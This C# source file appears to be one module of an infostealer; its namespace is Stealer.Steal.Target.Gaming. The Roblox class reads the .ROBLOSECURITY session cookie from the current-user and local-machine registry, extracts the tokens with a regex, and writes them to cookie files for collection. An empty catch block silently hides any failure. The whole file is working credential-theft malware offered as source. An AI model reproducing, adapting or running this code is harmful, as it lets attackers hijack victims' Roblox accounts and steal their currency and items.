using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Gaming;

internal class Roblox
{
	public static void Start()
	{
		try
		{
			Regex regex = new Regex("_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+", RegexOptions.Compiled);
			using (RegistryKey registryKey = Registry.CurrentUser)
			{
				List<string> list = new List<string>();
				RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com");
				if (registryKey2 != null)
				{
					object value = registryKey2.GetValue(".ROBLOSECURITY");
					if (value != null)
					{
						foreach (Match item in regex.Matches((string)value))
						{
							list.Add(item.Value);
						}
					}
				}
				DynamicFiles.WriteAllText(Path.Combine("Games", "Roblox", "HKCU_Cookie.txt"), string.Join("\n", (IEnumerable<string?>)list.ToArray()));
			}
			using RegistryKey registryKey3 = Registry.LocalMachine;
			List<string> list2 = new List<string>();
			RegistryKey registryKey4 = registryKey3.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com");
			if (registryKey4 != null)
			{
				object value2 = registryKey4.GetValue(".ROBLOSECURITY");
				if (value2 != null)
				{
					foreach (Match item2 in regex.Matches((string)value2))
					{
						list2.Add(item2.Value);
					}
				}
			}
			DynamicFiles.WriteAllText(Path.Combine("Games", "Roblox", "HKLM_Cookie.txt"), string.Join("\n", (IEnumerable<string?>)list2.ToArray()));
		}
		catch
		{
		}
	}
}
